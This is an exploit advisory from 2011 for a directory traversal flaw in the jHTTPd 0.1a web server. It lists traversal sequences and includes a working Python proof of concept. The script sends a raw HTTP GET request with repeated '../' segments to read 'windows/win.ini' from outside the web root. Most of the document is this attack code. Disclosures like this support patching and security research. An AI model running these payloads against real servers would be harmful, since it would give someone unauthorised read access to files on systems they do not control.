# ------------------------------------------------------------------------
# Software................jHTTPd 0.1a
# Vulnerability...........Directory Traversal
# Threat Level............Serious (3/5)
# Download................http://developer.gauner.org/jhttpd/
# Discovery Date..........3/28/2011
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................AutoSec Tools
# Site....................http://www.autosectools.com/
# Email...................John Leitch <john@autosectools.com>
# ------------------------------------------------------------------------
# 
# 
# --Description--
# 
# A directory traversal vulnerability in jHTTPd 0.1a can be exploited to
# read files outside of the web root.
# 
# 
# --Exploit--
# 
# ..\/
# ..//
# ..\
# ../
# 
# 
# --PoC--

import socket, urllib

host = 'localhost'
port = 8082
file = 'windows/win.ini'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.settimeout(8)    

print 'sending'

s.send('GET ' + '../' * 16 + file + ' HTTP/1.1\r\n'
    'Host: ' + host + '\r\n\r\n')
print s.recv(8192) + s.recv(8192)